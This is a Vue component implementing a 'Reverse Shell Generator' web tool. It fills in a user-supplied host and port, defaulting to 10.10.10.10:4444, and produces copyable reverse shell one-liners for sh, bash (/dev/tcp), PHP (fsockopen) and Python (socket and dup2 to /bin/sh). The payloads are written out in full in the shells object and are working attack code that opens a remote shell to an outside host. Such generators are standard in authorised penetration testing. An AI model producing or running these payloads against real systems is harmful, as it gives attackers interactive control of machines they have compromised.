<script setup lang="ts">
import { ref } from 'vue'
import { Icon } from '@iconify/vue'

const host = ref('10.10.10.10')
const port = ref('4444')
const copied = ref<string | null>(null)

const shells: Record<string, (h: string, p: string) => string> = {
  sh: (h, p) => `sh -i >& /dev/tcp/${h}/${p} 0>&1`,
  bash: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
  php: (h, p) => `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  python: (h, p) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
}

const activeTab = ref('sh')

async function copyToClipboard(text: string, type: string) {
  try {
    await navigator.clipboard.writeText(text)
    copied.value = type
    setTimeout(() => { copied.value = null }, 2000)
  } catch { /* ignore */ }
}
</script>

<template>
  <div class="w-full max-w-4xl rounded-xl border bg-card text-card-foreground shadow-sm">
    <div class="flex flex-col space-y-1.5 p-6">
      <h3 class="text-2xl font-semibold leading-none tracking-tight">Reverse Shell Generator</h3>
      <p class="text-sm text-muted-foreground">
        Generate reverse shell payloads for various languages
      </p>
    </div>
    <div class="p-6 pt-0 space-y-6">
      <div class="grid grid-cols-2 gap-4">
        <div class="space-y-2">
          <label for="host" class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70">Host/IP</label>
          <input
            id="host"
            v-model="host"
            type="text"
            placeholder="10.10.10.10"
            class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
          />
        </div>
        <div class="space-y-2">
          <label for="port" class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70">Port</label>
          <input
            id="port"
            v-model="port"
            type="text"
            placeholder="4444"
            class="flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
          />
        </div>
      </div>

      <div class="w-full">
        <div class="inline-flex h-10 items-center justify-center rounded-md bg-muted p-1 text-muted-foreground w-full grid-cols-4 grid">
          <button
            v-for="key in Object.keys(shells)"
            :key="key"
            @click="activeTab = key"
            :class="[
              'inline-flex items-center justify-center whitespace-nowrap rounded-sm px-3 py-1.5 text-sm font-medium ring-offset-background transition-all focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50',
              activeTab === key ? 'bg-background text-foreground shadow-sm' : 'hover:bg-background/50 hover:text-foreground'
            ]"
          >
            {{ key === 'bash' ? 'Bash' : key.toUpperCase() }}
          </button>
        </div>

        <div v-for="(generator, key) in shells" :key="key" v-show="activeTab === key" class="mt-3 space-y-2">
          <div class="relative">
            <pre class="bg-muted p-4 rounded-lg overflow-x-auto text-sm whitespace-pre-wrap break-all"><code>{{ host && port ? generator(host, port) : 'Enter host and port to generate payload' }}</code></pre>
            <button
              v-if="host && port"
              @click="copyToClipboard(generator(host, port), key)"
              class="absolute top-2 right-2 inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 hover:bg-accent hover:text-accent-foreground h-7 w-7"
            >
              <Icon v-if="copied === key" icon="mdi:check" class="h-4 w-4 text-green-500" />
              <Icon v-else icon="mdi:content-copy" class="h-4 w-4" />
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
